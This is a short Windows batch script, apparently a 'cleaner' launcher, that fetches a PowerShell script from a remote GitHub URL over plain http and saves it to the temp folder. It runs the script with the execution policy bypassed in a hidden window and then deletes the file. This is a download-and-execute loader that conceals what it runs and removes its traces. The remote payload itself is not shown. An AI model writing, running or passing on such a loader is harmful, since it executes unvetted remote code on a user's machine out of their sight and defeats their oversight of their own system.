@echo off
chcp 65001 > nul
set "PS_FILE=%TEMP%\cleanerds_run.ps1"

powershell -NoProfile -ExecutionPolicy Bypass -Command "^
    $code = (Invoke-RestMethod -Uri 'http://raw.githubusercontent.com/cleands/cds/refs/heads/main/script.ps1'); ^
    [System.IO.File]::WriteAllText('%PS_FILE%', $code, [System.Text.Encoding]::ASCII);"

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_FILE%"

del /f /q "%PS_FILE%" > nul 2>&1
